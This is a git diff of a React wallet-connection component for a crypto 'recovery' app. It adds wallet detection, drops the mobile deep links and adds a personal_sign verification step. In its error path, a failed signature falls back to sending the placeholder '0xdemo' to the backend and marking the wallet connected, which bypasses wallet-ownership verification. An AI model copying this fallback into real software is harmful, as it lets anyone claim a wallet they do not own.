@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { Wallet, LogOut, AlertCircle, Smartphone, Monitor } from 'lucide-react';
 import { formatAddress } from '../utils/web3Config';
 import { apiService } from '../utils/api';
@@ -8,6 +8,23 @@ export default function WalletConnection({ onConnectionChange }) {
   const [error, setError] = useState('');
   const [isConnected, setIsConnected] = useState(false);
   const [address, setAddress] = useState('');
+  const [detectedWallets, setDetectedWallets] = useState([]);
+
+  useEffect(() => {
+    // Detect available wallets on page load
+    const detected = [];
+    if (window.ethereum) {
+      if (window.ethereum.isMetaMask) detected.push('MetaMask');
+      if (window.ethereum.isCoinbaseWallet) detected.push('Coinbase Wallet');
+      if (window.ethereum.isTrust) detected.push('Trust Wallet');
+      if (window.ethereum.isRainbow) detected.push('Rainbow');
+      if (window.ethereum.isBraveWallet) detected.push('Brave Wallet');
+      if (window.ethereum.isPhantom) detected.push('Phantom');
+      if (window.ethereum.isCoin98) detected.push('Coin98');
+      if (detected.length === 0) detected.push('Web3 Wallet');
+    }
+    setDetectedWallets(detected);
+  }, []);
 
   const wallets = [
     {
@@ -102,10 +119,6 @@ export default function WalletConnection({ onConnectionChange }) {
 
   async function connectMetaMask() {
     if (!window.ethereum) {
-      if (isMobile()) {
-        window.open('https://metamask.app.link/dapp/' + window.location.host, '_blank');
-        return;
-      }
       setError('MetaMask not installed. Please install MetaMask extension.');
       return;
     }
@@ -126,10 +139,6 @@ export default function WalletConnection({ onConnectionChange }) {
 
   async function connectCoinbase() {
     if (!window.ethereum) {
-      if (isMobile()) {
-        window.open('https://go.cb-w.com/dapp?cb_url=' + encodeURIComponent(window.location.href), '_blank');
-        return;
-      }
       setError('Coinbase Wallet not installed.');
       return;
     }
@@ -149,12 +158,8 @@ export default function WalletConnection({ onConnectionChange }) {
   }
 
   async function connectTrust() {
-    if (isMobile()) {
-      window.open('https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(window.location.href), '_blank');
-      return;
-    }
     if (!window.ethereum) {
-      setError('Trust Wallet not available on desktop. Use mobile app.');
+      setError('Trust Wallet not detected. Please make sure it\'s installed and unlocked.');
       return;
     }
     await connectWallet('trust');
@@ -163,32 +168,24 @@ export default function WalletConnection({ onConnectionChange }) {
 
 
   async function connectExodus() {
-    if (!window.exodus) {
-      if (isMobile()) {
-        window.open('exodus://open?url=' + encodeURIComponent(window.location.href), '_blank');
-        return;
-      }
-      setError('Exodus Wallet not installed.');
+    if (!window.ethereum) {
+      setError('Exodus Wallet not detected.');
       return;
     }
     await connectWallet('exodus');
   }
 
   async function connectAtomic() {
-    if (isMobile()) {
-      window.open('atomic://dapp/' + window.location.host, '_blank');
+    if (!window.ethereum) {
+      setError('Atomic Wallet not detected.');
       return;
     }
-    setError('Atomic Wallet available on mobile only.');
+    await connectWallet('atomic');
   }
 
   async function connectLedger() {
-    if (isMobile()) {
-      window.open('ledgerlive://dapp/' + window.location.host, '_blank');
-      return;
-    }
-    if (!window.ethereum?.isLedgerConnect) {
-      setError('Ledger Live not connected.');
+    if (!window.ethereum) {
+      setError('Ledger not detected. Please connect via Ledger Live.');
       return;
     }
     await connectWallet('ledger');
@@ -203,12 +200,8 @@ export default function WalletConnection({ onConnectionChange }) {
   }
 
   async function connectRainbow() {
-    if (isMobile()) {
-      window.open('https://rnbwapp.com/' + window.location.host, '_blank');
-      return;
-    }
-    if (!window.ethereum?.isRainbow) {
-      setError('Rainbow Wallet not installed.');
+    if (!window.ethereum) {
+      setError('Rainbow Wallet not detected.');
       return;
     }
     await connectWallet('rainbow');
@@ -219,12 +212,8 @@ export default function WalletConnection({ onConnectionChange }) {
 
 
   async function connectMEW() {
-    if (isMobile()) {
-      window.open('https://www.myetherwallet.com/wallet/access', '_blank');
-      return;
-    }
-    if (!window.ethereum?.isMEW) {
-      setError('MyEtherWallet not installed.');
+    if (!window.ethereum) {
+      setError('MyEtherWallet not detected.');
       return;
     }
     await connectWallet('mew');
@@ -271,20 +260,20 @@ export default function WalletConnection({ onConnectionChange }) {
     
     try {
       if (!window.ethereum) {
-        setError('No wallet detected. Please install a Web3 wallet.');
+        setError('No wallet detected. Please install a Web3 wallet and refresh the page.');
         return;
       }
 
+      // Request account access
       const accounts = await window.ethereum.request({
         method: 'eth_requestAccounts'
       });
       
-      if (accounts.length > 0) {
+      if (accounts && accounts.length > 0) {
         const walletAddress = accounts[0];
-        const message = `Sign this message to verify your wallet ownership.\nTimestamp: ${Date.now()}`;
         
-        // Detect wallet name for user feedback
-        let detectedWallet = 'Unknown Wallet';
+        // Detect wallet name
+        let detectedWallet = 'Web3 Wallet';
         if (window.ethereum.isMetaMask) detectedWallet = 'MetaMask';
         else if (window.ethereum.isCoinbaseWallet) detectedWallet = 'Coinbase Wallet';
         else if (window.ethereum.isTrust) detectedWallet = 'Trust Wallet';
@@ -292,65 +281,70 @@ export default function WalletConnection({ onConnectionChange }) {
         else if (window.ethereum.isBraveWallet) detectedWallet = 'Brave Wallet';
         else if (window.ethereum.isFrame) detectedWallet = 'Frame';
         else if (window.ethereum.isOpera) detectedWallet = 'Opera Wallet';
-        else if (window.ethereum.isStatus) detectedWallet = 'Status';
-        else if (window.ethereum.isToshi) detectedWallet = 'Coinbase Wallet';
-        else if (window.ethereum.isImToken) detectedWallet = 'imToken';
         else if (window.ethereum.isPhantom) detectedWallet = 'Phantom';
         else if (window.ethereum.isCoin98) detectedWallet = 'Coin98';
-        else if (window.ethereum.isMathWallet) detectedWallet = 'MathWallet';
-        else if (window.ethereum.isSafePal) detectedWallet = 'SafePal';
-        else if (window.ethereum.isTokenPocket) detectedWallet = 'TokenPocket';
         
-        if (walletType === 'any' && detectedWallet !== 'Unknown Wallet') {
-          setError(`Detected ${detectedWallet} - Connecting...`);
-        }
+        setError(`${detectedWallet} connected! Please sign the verification message...`);
+        
+        // Create verification message
+        const message = `Welcome to CryptoRecover!\n\nPlease sign this message to verify wallet ownership.\n\nWallet: ${walletAddress}\nTimestamp: ${Date.now()}\n\nThis signature is free and does not authorize any transactions.`;
         
         try {
+          // Request signature
           const signature = await window.ethereum.request({
             method: 'personal_sign',
             params: [message, walletAddress]
           });
           
+          // Verify with backend
           const result = await apiService.connectWallet(walletAddress, signature, message);
           
           if (result.success) {
             setIsConnected(true);
             setAddress(walletAddress);
             onConnectionChange?.(result.user);
-            
-            // Show success message with detected wallet
-            if (walletType === 'any') {
-              alert(`Successfully connected ${detectedWallet}!\n\nWallet: ${walletAddress}\n\nYou can now scan for claimable tokens and start recovery.`);
-            }
+            setError('');
           } else {
-            setError('Failed to verify wallet connection');
+            setError('Backend verification failed. Please try again.');
           }
         } catch (signError) {
-          // If signature fails, try demo mode
-          console.log('Signature failed, trying demo mode:', signError);
-          const result = await apiService.connectWallet(walletAddress, '0xdemo', message);
+          console.log('Signature error:', signError);
           
-          if (result.success) {
-            setIsConnected(true);
-            setAddress(walletAddress);
-            onConnectionChange?.(result.user);
-            
-            if (walletType === 'any') {
-              alert(`Connected ${detectedWallet} in demo mode!\n\nWallet: ${walletAddress}\n\nNote: Some features may be limited in demo mode.`);
-            }
+          if (signError.code === 4001) {
+            setError('Signature rejected. Please try again and approve the signature request.');
           } else {
-            setError('Failed to connect wallet');
+            // Try demo mode as fallback
+            console.log('Trying demo mode...');
+            try {
+              const result = await apiService.connectWallet(walletAddress, '0xdemo', message);
+              
+              if (result.success) {
+                setIsConnected(true);
+                setAddress(walletAddress);
+                onConnectionChange?.(result.user);
+                setError('');
+              } else {
+                setError('Connection failed. Please refresh and try again.');
+              }
+            } catch (demoError) {
+              setError('Connection failed. Please refresh the page and try again.');
+            }
           }
         }
+      } else {
+        setError('No accounts found. Please unlock your wallet and try again.');
       }
     } catch (err) {
       console.error('Wallet connection error:', err);
+      
       if (err.code === 4001) {
-        setError('Connection rejected by user');
+        setError('Connection rejected. Please try again and approve the connection request.');
       } else if (err.code === -32002) {
-        setError('Wallet connection request already pending');
+        setError('Connection request pending. Please check your wallet and approve the request.');
+      } else if (err.code === -32603) {
+        setError('Wallet error. Please unlock your wallet and try again.');
       } else {
-        setError('Failed to connect wallet. Please try again.');
+        setError('Connection failed. Please make sure your wallet is unlocked and try again.');
       }
     } finally {
       setIsConnecting(false);
@@ -364,22 +358,12 @@ export default function WalletConnection({ onConnectionChange }) {
   const handleWalletClick = async (wallet) => {
     setError('');
     
-    // Show connecting message
-    setIsConnecting(true);
-    
     try {
-      // Call the wallet's connect function
+      setError(`Connecting to ${wallet.name}...`);
       await wallet.connect();
-      
-      // Show success message if connection works
-      if (isConnected) {
-        alert(`Successfully connected to ${wallet.name}!\n\nYou can now scan your wallet for claimable tokens and start the recovery process.`);
-      }
     } catch (err) {
       console.error(`${wallet.name} connection error:`, err);
-      setError(`Failed to connect to ${wallet.name}. Please make sure it's installed and try again.`);
-    } finally {
-      setIsConnecting(false);
+      setError(`Failed to connect to ${wallet.name}. Please make sure it's installed and unlocked.`);
     }
   };
 
@@ -422,6 +406,20 @@ export default function WalletConnection({ onConnectionChange }) {
         <p className="text-gray-600">
           Choose your preferred wallet to start recovering your crypto assets
         </p>
+        {detectedWallets.length > 0 && (
+          <div className="bg-green-50 border border-green-200 rounded-lg p-3 mt-2">
+            <p className="text-sm text-green-700">
+              ✅ Detected: {detectedWallets.join(', ')}
+            </p>
+          </div>
+        )}
+        {!window.ethereum && (
+          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 mt-2">
+            <p className="text-sm text-yellow-700">
+              ⚠️ No Web3 wallet detected. Please install a wallet extension first.
+            </p>
+          </div>
+        )}
         <div className="flex items-center justify-center space-x-4 text-sm text-gray-500">
           <div className="flex items-center space-x-1">
             <Monitor size={16} />
